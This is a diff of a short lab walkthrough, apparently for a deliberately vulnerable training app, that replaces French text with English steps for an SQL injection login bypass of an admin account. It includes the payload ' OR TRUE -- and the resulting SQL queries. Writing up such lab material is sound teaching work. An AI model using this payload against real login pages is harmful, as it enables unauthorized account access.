@@ -1,18 +1,13 @@
-# Login Admin
-**Difficulté**: ⭐⭐
-**Catégorie**: Injection (SQLi)
+## Login Admin
+### Challenge: Log in with the administrator's user account.
 
-## Description
-Se connecter avec le compte administrateur via injection SQL.
-
-## Exploitation manuelle
-1. Aller à la page de connexion
-2. Saisir dans le champ email:
-   ```
-   ' OR TRUE --
-   ```
-3. Saisir n'importe quel mot de passe
-4. Cliquer sur "Log in"
-
-## Exploitation automatisée
-Voir le fichier `solution.py`.
+1. Navigate to account login
+2. Submit `'` in email field and any password to observe error log with SQL query
+  ```
+  "SELECT * FROM Users WHERE email = ''' AND password = 'c06db68e819be6ec3d26c6038d8e8d1f' AND deletedAt IS NULL"
+  ```
+3. Submit `' OR TRUE --` in email field and any password where `'` closes the email string and `OR TRUE --` returns boolean true and comments out the rest of the SQL query
+  ```
+  "SELECT * FROM Users WHERE email = '' OR TRUE -- AND password = 'c06db68e819be6ec3d26c6038d8e8d1f' AND deletedAt IS NULL"
+  ```
+4. Observe login with first user account (happens to be admin in this case)
